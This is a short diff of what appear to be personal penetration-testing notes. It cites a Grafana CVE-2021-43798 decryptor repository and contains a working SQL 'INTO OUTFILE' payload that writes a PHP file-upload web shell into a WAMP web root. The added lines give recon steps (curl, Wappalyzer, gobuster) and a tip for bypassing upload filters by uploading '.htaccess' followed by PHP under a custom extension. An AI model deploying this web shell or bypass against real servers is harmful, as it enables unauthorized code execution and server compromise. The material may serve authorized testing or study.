@@ -47,7 +47,7 @@ https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
 ` SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'; ` 
 
 
-
-Also check for /webdav , /zm , /login 
-Use curl -v to check header & version. 
+Use curl -v to check header & version. Wappalyzer? 
+Also check for /webdav , /zm , /login ; and gobuster to find upload folder. 
+Try uploading `.htaccess` then php using custom ext (eg .dork). 
 
